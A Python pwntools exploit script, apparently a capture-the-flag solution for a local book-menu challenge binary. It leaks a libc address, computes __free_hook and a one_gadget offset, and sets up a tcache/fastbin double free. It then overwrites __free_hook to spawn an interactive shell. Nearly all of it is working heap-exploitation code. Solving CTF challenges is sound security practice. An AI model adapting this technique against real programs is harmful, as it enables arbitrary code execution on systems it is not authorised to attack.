from pwn import *

LOCAL = 0
if LOCAL:
    p = process('../src/server/chall')
else:
    p = remote('localhost', 9999)

# leak __malloc_hook

# make one book
p.recvuntil(b'> ')
p.sendline(b'1')
p.sendline(b'0')
p.sendline(b'a')
p.sendline(b'1')

# rearrange
p.recvuntil(b'> ')
p.sendline(b'3')

# read [3][0], but don't free it. the leaked is on title
p.recvuntil(b'> ')
p.sendline(b'2')
p.sendline(b'3')
p.sendline(b'0')
p.sendline(b'0')
res = p.recvuntil(b'Menu:')[51:57] + b'\x00\x00'
__malloc_hook = u64(res) - 0x230ae0 # distance from leaked address from __malloc_hook
libc_base = __malloc_hook - 0x3ebc30
__free_hook = 0x3ed8e8 + libc_base
one_gadget = 0x10a41c + libc_base
print("__malloc_hook:", hex(__malloc_hook))
print("__free_hook:", hex(__free_hook))
print("one_gadget:", hex(one_gadget))

# make 15 books, 8 in row 0, 7 in row 1
for i in range(8):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.sendline(b'0')
    p.sendline(b'a')
    p.sendline(b'1')

for i in range(7):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.sendline(b'1')
    p.sendline(b'a')
    p.sendline(b'1')

# rearrange to make tcachebin full
p.recvuntil(b'> ')
p.sendline(b'3')

# read to trigger double free (in fastbin)
p.recvuntil(b'> ')
p.sendline(b'2')
p.sendline(b'0')
p.sendline(b'0')
p.sendline(b'1')

# rearrange
p.recvuntil(b'> ')
p.sendline(b'3')

# double free
p.recvuntil(b'> ')
p.sendline(b'2')
p.sendline(b'0')
p.sendline(b'5')
p.sendline(b'1')

# make tcachebin empty
for i in range(7):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.sendline(b'0')
    p.sendline(b'a')
    p.sendline(b'1')

# set __free_hook address as forged chunk
p.recvuntil(b'> ')
p.sendline(b'1')
p.sendline(b'1')
p.sendline(p64(__free_hook))
p.sendline(b'1')

# padding
for i in range(2):
    p.recvuntil(b'> ')
    p.sendline(b'1')
    p.sendline(b'1')
    p.sendline(b'a')
    p.sendline(b'1')

# set __free_hook with one_gadget
p.recvuntil(b'> ')
p.sendline(b'1')
p.sendline(b'1')
p.sendline(p64(one_gadget))
p.sendline(b'1')

# free again, it should call that one_gadget
p.recvuntil(b'> ')
p.sendline(b'2')
p.sendline(b'0')
p.sendline(b'1')
p.sendline(b'1')

p.interactive()